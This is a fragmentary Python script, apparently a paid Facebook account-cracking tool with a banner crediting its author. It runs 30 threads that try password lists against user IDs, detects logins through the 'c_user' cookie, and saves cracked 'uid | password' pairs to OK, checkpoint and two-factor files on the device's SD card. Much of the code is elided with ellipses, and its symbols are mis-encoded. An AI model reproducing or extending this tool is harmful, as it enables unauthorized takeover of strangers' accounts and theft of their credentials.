...
\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] ADMIN       : Arafat Bin Mahin

\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] FACEBOOK    : Arafat Mahin

\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] VERSION     : \033[38;5;196m1.0.0 \033[38;5;46mPAID
...
def gmail():
    ...
    with ThreadPool(max_workers=30) as setu:
        ...
        print(f'\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] FILE SAVE   : \033[38;5;46m/SDCARD/MAHIN-OK.txt')

        print(f'\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] FILE SAVE   : \033[38;5;196m/SDCARD/MAHIN-CP.txt')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/Mahin-X-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ...
                print(f'\033[38;5;206m[Mahin-CP] '+uid+'|'+ps+' âœ“ '+roksana(uid)+'\033[36;1m')

                open('/sdcard/Mahin-X-CP.txt', 'a').write(uid+' | '+ps+'\n')
                ...
                print(f'\033[38;5;208m[Mahin-2F] '+uid+'|'+ps+' âœ“ '+roksana(uid)+'\033[36;1m')

                open('/sdcard/Mahin-X-2F.txt', 'a').write(uid+' | '+ps+'\n')
